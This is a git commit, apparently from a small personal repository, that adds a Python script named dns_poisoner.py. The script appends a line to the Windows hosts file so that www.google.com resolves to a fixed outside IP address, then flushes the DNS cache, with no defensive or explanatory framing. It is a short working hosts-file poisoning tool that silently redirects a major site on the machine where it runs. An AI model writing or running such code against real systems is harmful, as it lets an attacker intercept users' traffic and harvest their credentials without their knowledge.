1161b8b362ac739537dacf70fb8f60511ad3cbc7
cybernight <cybernight646@gmail.com>
2026-01-05 13:01:34 +0000

    Create dns_poisoner.py to modify hosts file
    This script modifies the hosts file to redirect www.google.com to a specific IP address and flushes the DNS cache.

---
+++ dns-poisoner/dns_poisoner.py
@@ -0,0 +1,13 @@
+import subprocess
+import os
+
+# Change directory to the location of the hosts file
+os.chdir(r"C:\Windows\System32\drivers\etc")
+
+# Add a record to the hosts file
+command = 'echo 143.198.146.37 www.google.com >> hosts'
+subprocess.run(command, shell=True, check=True)
+
+# Flush DNS cache
+command = 'ipconfig /flushdns'
+subprocess.run(command, shell=True, check=True)
